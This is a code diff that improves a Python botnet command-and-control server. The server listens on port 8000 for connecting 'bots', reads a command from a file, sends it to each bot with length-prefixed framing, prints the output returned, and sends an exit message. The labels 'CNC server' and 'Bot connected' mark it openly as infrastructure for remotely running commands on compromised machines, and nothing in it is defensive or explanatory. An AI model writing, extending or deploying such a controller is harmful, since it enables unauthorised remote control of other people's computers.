@@ -1,4 +1,26 @@
 import socketserver
+import struct
+
+def recvcall(sock, n):
+    data = b''
+    while len(data) < n:
+        chunk = sock.recv(n - len(data))
+        if not chunk:
+            return None
+        data += chunk
+    return data
+
+def send_msg(sock, payload: bytes):
+    sock.sendall(struct.pack('!I', len(payload)) + payload)
+
+def recv_msg(sock):
+    hdr = recvcall(sock, 4)
+    if not hdr:
+        return None
+    length = struct.unpack('!I', hdr)[0]
+    if length == 0:
+        return b''
+    return recvcall(sock, length)
 
 # Read command from file
 with open("commands.txt", "r") as f:
@@ -6,21 +28,29 @@ with open("commands.txt", "r") as f:
 
 class BotHandler(socketserver.BaseRequestHandler):
     def handle(self):
-        print(f"Bot connected from: {self.client_address[0]}")
+        bot_ip = self.client_address[0]
+        print(f"[+] Bot connected from: {bot_ip}")
         
-        try:
-            # Send command
-            self.request.sendall(command_to_send.encode())
+        hello = recv_msg(self.request)
 
-            # Receive response
-            data = self.request.recv(4096).decode()
-            print(f"[{self.client_address[0]}] Response:\n{data}\n")
+        if hello:
+            print(f"[{bot_ip}] hello :: {hello.decode(errors='replace')}")
 
-        except Exception as e:
-            print(f"Error handling bot {self.client_address[0]}: {e}")
+        # Send command
+        send_msg(self.request, command_to_send.encode())
+
+        resp = recv_msg(self.request)
+        
+        if resp is None:
+            print(f"[{bot_ip}][!] disconnected before sending output.")
+            return
+        print(f"\n[{bot_ip}][+] Output for '{command_to_send}' ::\n{resp.decode(errors='replace')}\n")
+
+        # Optional clean exit
+        send_msg(self.request, b"exit")
 
 if __name__ == "__main__":
     HOST, PORT = "", 8000
     with socketserver.ThreadingTCPServer((HOST, PORT), BotHandler) as server:
-        print(f"CNC server running on port {PORT}...")
+        print(f"[+] CNC server is running on port {PORT} ... ")
         server.serve_forever()
